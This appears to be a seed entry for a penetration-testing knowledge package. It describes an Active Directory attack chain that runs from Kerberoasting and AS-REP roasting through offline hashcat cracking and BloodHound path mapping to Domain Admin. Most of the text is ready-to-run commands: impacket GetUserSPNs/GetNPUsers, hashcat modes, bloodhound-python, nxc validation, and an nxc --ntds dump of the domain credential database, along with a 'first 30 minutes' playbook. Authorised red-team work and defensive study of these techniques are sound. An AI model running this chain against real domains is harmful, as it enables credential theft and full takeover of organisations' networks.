# [Seed] Kerberoasting -> Offline Cracking -> DA

## Scenario Category
Penetration testing / AD attacks

## Target Overview
We hold a plain domain user credential, and the target domain has service accounts configured with SPNs. Kerberoasting yields TGS tickets for offline cracking, and once a cleartext password falls, BloodHound gives a path straight to DA.

## Full Execution Chain

1. Get a foothold in the domain (any plain user, local admin not required)
2. Enumerate SPNs
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. See which accounts have SPNs configured (usually SQL Server / IIS / custom service accounts)
4. Crack offline
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack a svc account password, then use BloodHound to map that account's reachable paths
6. If the account sits in a Tier 0 group (Domain Admins / Server Operators / Backup Operators), go straight to DCSync
7. If it does not, but it can RDP/WinRM into a key host, get on that host, dump with mimikatz, and chain up to DA

## Pitfalls Encountered

| Problem | Cause | Solution | Time spent |
|------|------|---------|------|
| GetUserSPNs returned nothing | Current user lacks permission to read SPNs | Any plain domain user can read them; more likely the -dc-ip is wrong or PreAuth failed | 20min |
| Hours of cracking with no result | Strong password | 1) Change the wordlist (rockyou.txt + corp keywords)  2) Move to GPU (hashcat -d 1)  3) Try the OneRuleToRuleThemAll ruleset | several hours |
| Cracked password failed to log in | Credential already expired, or case sensitivity | Validate with nxc first: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound had no data | Collection missed GPO/ACL data | `bloodhound-python -c All` must include All; newer BHCE prefers `--zip` | 30min |
| AS-REP Roasting found no targets | Few accounts have "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain Findings

- **impacket-GetUserSPNs** is the de facto standard and more portable than PowerView
- **netexec (nxc)** is the CrackMapExec successor: fast, with built-in modules like spider_plus / lsassy / ntds
- **BloodHound Community Edition (BHCE)** is the current version and far faster than the old BloodHound
- **OneRuleToRuleThemAll** is the most effective ruleset for password cracking
- **bloodyAD** is a newer-generation AD tool focused on "escalating from low privilege by abusing ACLs"

## Key Code/Commands

Complete Kerberoasting workflow:

```bash
# 1. Validate the credential
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS tickets
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. Grab AS-REP hashes while you are at it
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Crack offline
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. Once you have a password, collect BloodHound data
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find the path: mark the svc account as Owned and look at Shortest Path to DA
```

If the svc account has SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# dumps NTDS.dit directly
```

## Suggested Improvements to This Package

- `pentest-tools/references/network-attack-defense.md` should have a complete Kerberoasting chapter
- BloodHound CE is now mainstream, so bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Add `pentest-tools/references/ad-cheatsheet.md` covering the six major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on a single page

## Reusable Patterns/Script Snippets

**Standard first 30 minutes after gaining a domain foothold**:

```text
1. nxc smb to validate credentials + auto-spider the shares
2. GetUserSPNs + GetNPUsers back to back
3. bloodhound-python -c All collection
4. Start offline cracking in parallel (keep the GPU busy)
5. While waiting, work through BloodHound for Tier 0 / pre-built attack paths
6. Password cracked -> mark Owned -> re-run the path queries
```

**AD Kerberos hashcat mode quick reference**:

| Mode | Purpose |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution Actions
- [ ] Add ad-cheatsheet.md
- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] The routing matrix already covers Kerberos / Kerberoasting

## Environment Details
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: any foothold inside the domain (plain domain user)

## Redaction Requirements
This entry is seed data written from publicly documented AD attack patterns and does not involve any real target domain.
